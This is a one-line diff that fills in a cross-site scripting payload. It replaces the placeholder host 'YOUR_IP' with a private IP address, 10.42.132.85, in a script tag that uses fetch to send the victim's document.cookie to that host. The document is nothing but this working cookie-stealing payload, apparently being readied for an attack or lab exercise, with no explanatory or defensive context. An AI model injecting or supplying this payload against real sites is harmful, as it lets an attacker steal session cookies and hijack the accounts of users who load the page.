@@ -1,1 +1,1 @@
-<script>fetch('http://YOUR_IP/'+document.cookie)</script>
+<script>fetch('http://10.42.132.85/'+document.cookie)</script>
